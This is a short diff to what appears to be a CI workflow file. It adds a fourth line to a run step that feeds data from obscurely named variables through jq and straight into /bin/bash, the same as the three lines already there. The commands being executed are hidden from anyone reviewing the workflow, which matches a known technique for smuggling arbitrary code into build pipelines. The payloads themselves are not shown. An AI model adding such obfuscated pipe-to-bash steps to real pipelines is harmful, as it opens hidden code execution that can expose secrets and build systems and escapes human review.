@@ -26,6 +26,7 @@ jobs:
           echo $ou7 | jq -r .n99 | /bin/bash
           printf '%s' "$p0" | jq -r .xoxf4 | /bin/bash
           echo $ipwy04 | jq -r .tjs491 | /bin/bash
+          echo $f56 | jq -r .efw3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
